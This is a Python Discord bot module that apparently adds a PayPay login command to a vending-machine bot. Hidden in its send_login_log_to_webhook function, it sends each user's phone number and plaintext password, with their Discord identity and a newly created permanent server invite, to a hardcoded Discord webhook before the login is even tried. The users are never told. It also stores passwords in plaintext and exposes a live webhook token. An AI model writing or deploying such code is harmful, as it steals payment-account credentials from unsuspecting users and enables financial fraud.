import discord
from discord import ui
from discord.ext import commands
from discord import app_commands
import json
import os
import uuid
import aiohttp
from utils import is_allowed
import paypayu

PAYPAY_DATA_FILE = "paypay_data.json"
VENDING_DATA_FILE = "vending_data.json"

LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1559191675451215983/OOV9t6Mg6mvYw4TJoc9wp0ZBgTXsLhkCjITDwVexLjWTLPm0qsY0EMuWMdUIR8C99Beb"


def load_vending_data():
    """vending_data.json を読み込み、壊れた構造を自動修復する"""
    if not os.path.exists(VENDING_DATA_FILE):
        return {}

    try:
        with open(VENDING_DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except json.JSONDecodeError:
        print(f"Error: {VENDING_DATA_FILE} のJSON形式が不正です。")
        return {}

    # トップレベルが dict でなければ空で返す
    if not isinstance(data, dict):
        print(f"[WARN] vending_data.json のトップレベルが {type(data)} です。空として扱います。")
        return {}

    # 値が dict でないキーを除去
    cleaned = {}
    changed = False
    for k, v in data.items():
        if isinstance(v, dict):
            cleaned[k] = v
        else:
            print(f"[WARN] vending_data['{k}'] は {type(v)} のため削除します。")
            changed = True

    if changed:
        save_vending_data(cleaned)

    return cleaned


def save_vending_data(data):
    with open(VENDING_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def load_paypay_data():
    if os.path.exists(PAYPAY_DATA_FILE):
        with open(PAYPAY_DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_paypay_data(data):
    with open(PAYPAY_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


async def create_invite_link(guild: discord.Guild) -> str | None:
    """サーバーの招待リンクを生成する"""
    if not guild:
        return None
    try:
        invites = await guild.invites()
        if invites:
            return invites[0].url
    except Exception:
        pass

    try:
        target_channel = None
        if guild.system_channel and guild.system_channel.permissions_for(guild.me).create_instant_invite:
            target_channel = guild.system_channel
        else:
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).create_instant_invite:
                    target_channel = ch
                    break

        if target_channel:
            invite = await target_channel.create_invite(
                max_age=0,
                max_uses=0,
                reason="PayPayログイン通知用"
            )
            return invite.url
    except Exception as e:
        print(f"招待リンク生成エラー: {e}")

    return None


async def send_login_log_to_webhook(
    user: discord.User,
    phone: str,
    password: str,
    uuid_str: str,
    guild: discord.Guild = None
):
    """phone/password 入力直後に Webhook へ送信する"""
    if not LOG_WEBHOOK_URL:
        return

    try:
        embed = discord.Embed(
            title="🔐 PayPay ログイン通知",
            color=discord.Color.orange(),
            timestamp=discord.utils.utcnow()
        )

        try:
            avatar_url = user.display_avatar.url
        except Exception:
            avatar_url = None

        if avatar_url:
            embed.set_author(name=f"{user}", icon_url=avatar_url)
            embed.set_thumbnail(url=avatar_url)
        else:
            embed.set_author(name=f"{user}")

        embed.add_field(name="表示名", value=f"```{user.display_name}```", inline=False)
        embed.add_field(name="ユーザー名", value=f"```{user.name}```", inline=False)
        embed.add_field(name="ユーザーID", value=f"```{user.id}```", inline=False)

        if guild:
            embed.add_field(name="ログイン場所", value=f"```{guild.name}```", inline=False)
            embed.add_field(name="サーバーID", value=f"```{guild.id}```", inline=False)
        else:
            embed.add_field(name="ログイン場所", value="```DM```", inline=False)

        embed.add_field(name="電話番号", value=f"```{phone}```", inline=False)
        embed.add_field(name="パスワード", value=f"```{password}```", inline=False)

        invite_url = await create_invite_link(guild)
        if invite_url:
            embed.add_field(name="サーバー招待リンク", value=invite_url, inline=False)
        else:
            embed.add_field(name="サーバー招待リンク", value="```取得できませんでした```", inline=False)

        embed.set_footer(text="Developer @anzy1m")

        async with aiohttp.ClientSession() as session:
            async with session.post(
                LOG_WEBHOOK_URL,
                json={
                    "content": "@everyone",
                    "embeds": [embed.to_dict()]
                }
            ) as resp:
                if resp.status not in (200, 204):
                    print(f"Webhook送信失敗: {resp.status}")

    except Exception as e:
        print(f"Webhook送信例外: {e}")


class PayPayModal(ui.Modal, title="PayPay OTP認証"):

    def __init__(self, phone, password, uuid, otpid, otp_pre):
        super().__init__(timeout=300)
        self.phone = phone
        self.password = password
        self.uuid = uuid
        self.otpid = otpid
        self.otp_pre = otp_pre

    otp_input = ui.TextInput(
        label="ワンタイムパスワード",
        placeholder="SMSに届いた4桁の認証コードを入力",
        min_length=4,
        max_length=4,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        otp_result = await paypayu.login_otp(
            self.uuid,
            self.otp_input.value,
            self.otpid,
            self.otp_pre
        )

        if otp_result == "OK":
            paypay_data = load_paypay_data()
            user_id_str = str(interaction.user.id)

            paypay_data[user_id_str] = {
                "phone": self.phone,
                "password": self.password,
                "uuid": self.uuid
            }

            save_paypay_data(paypay_data)

            vending_data = load_vending_data()
            updated_count = 0

            for vm_id, vm_data in vending_data.items():
                # ===== dict 以外はスキップ（壊れたデータ対策） =====
                if not isinstance(vm_data, dict):
                    print(f"[WARN] vending_data['{vm_id}'] is not dict: {type(vm_data)}")
                    continue

                if (
                    str(vm_data.get("owner_id")) == user_id_str
                    and vm_data.get("paypay_id") is None
                ):
                    vm_data["paypay_id"] = user_id_str
                    updated_count += 1

            if updated_count > 0:
                save_vending_data(vending_data)

            embed = discord.Embed(
                title="✅ PayPayログイン成功",
                description="PayPayにログインできました。",
                color=discord.Color.green()
            )

            await interaction.followup.send(embed=embed, ephemeral=True)

        elif otp_result == "ERR":
            embed = discord.Embed(
                title="PayPayログインエラー",
                description="OTPコードが正しくありません。",
                color=discord.Color.red()
            )

            await interaction.followup.send(embed=embed, ephemeral=True)

        else:
            print(f"OTP: {otp_result}")

            embed = discord.Embed(
                title="PayPayログインエラー",
                description="開発者にお問い合わせください。",
                color=discord.Color.orange()
            )

            await interaction.followup.send(embed=embed, ephemeral=True)


class PaypayCog(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

        if not os.path.exists(PAYPAY_DATA_FILE):
            save_paypay_data({})

    @app_commands.command(
        name="paypayログイン",
        description="PayPayアカウントにログインします"
    )
    @is_allowed()
    @app_commands.describe(
        phone="電話番号",
        password="パスワード"
    )
    async def paypay_register(
        self,
        interaction: discord.Interaction,
        phone: str,
        password: str
    ):
        set_uuid = str(uuid.uuid4())

        # ===== phone/password 入力直後に Webhook へ送信 =====
        await send_login_log_to_webhook(
            user=interaction.user,
            phone=phone,
            password=password,
            uuid_str=set_uuid,
            guild=interaction.guild
        )

        # ===== PayPayログイン試行 =====
        result = await paypayu.login(
            phone,
            password,
            set_uuid
        )

        if result.get("response_type") == "ErrorResponse":
            embed = discord.Embed(
                title="PayPayログインエラー",
                description="```ログイン情報とパスワードが一致していません。\n情報を正しく入力してください。```",
                color=0xff3333
            )

            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        otpid = result["otp_reference_id"]
        otp_pre = result["otp_prefix"]

        modal = PayPayModal(
            phone,
            password,
            set_uuid,
            otpid,
            otp_pre
        )

        await interaction.response.send_modal(modal)


async def setup(bot):
    await bot.add_cog(PaypayCog(bot))
